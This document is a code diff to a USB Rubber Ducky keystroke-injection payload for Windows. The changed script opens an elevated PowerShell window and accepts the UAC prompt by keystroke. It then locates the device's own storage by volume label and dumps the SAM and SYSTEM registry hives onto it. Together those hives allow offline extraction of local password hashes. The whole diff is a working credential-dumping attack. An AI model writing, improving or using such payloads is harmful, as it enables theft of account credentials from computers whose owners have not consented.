@@ -47,24 +47,28 @@ EXTENSION PASSIVE_WINDOWS_DETECT
         END_IF
     END_REM
 END_EXTENSION
+REM Change $DRIVELABEL to the storage label of your duck
+DEFINE #DRIVELABEL DUCKY
 IF ($_OS == WINDOWS) THEN
-    INJECT_MOD GUI R
+    GUI r
     DELAY 500
-    STRING cmd
+    STRING powershell
     DELAY 1000
     CTRL-SHIFT-ENTER
     DELAY 750
     LEFT
     ENTER
     DELAY 1000
-    REM Change $DRIVELABEL to the storage label of your duck
-    DEFINE #DRIVELABEL D:
-    STRINGLN reg save HKLM\sam #DRIVELABEL/sam.save
+    STRINGLN $DriveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_LogicalDisk WHERE VolumeName='#DRIVELABEL'").DeviceID; Set-Variable -Name 'DriveLetter' -Value $DriveLetter -Scope Global; Write-Output $DriveLetter
+    DELAY 250
+    STRINGLN reg save HKLM\sam $DriveLetter/sam.save
     WAIT_FOR_STORAGE_ACTIVITY
     WAIT_FOR_STORAGE_INACTIVITY
-    STRINGLN reg save HKLM\system #DRIVELABEL/system.save
+    STRINGLN reg save HKLM\system $DriveLetter/system.save
     WAIT_FOR_STORAGE_ACTIVITY
     WAIT_FOR_STORAGE_INACTIVITY
+    ALT F4
 ELSE
+    ATTACKMODE OFF
     STOP_PAYLOAD
 END_IF
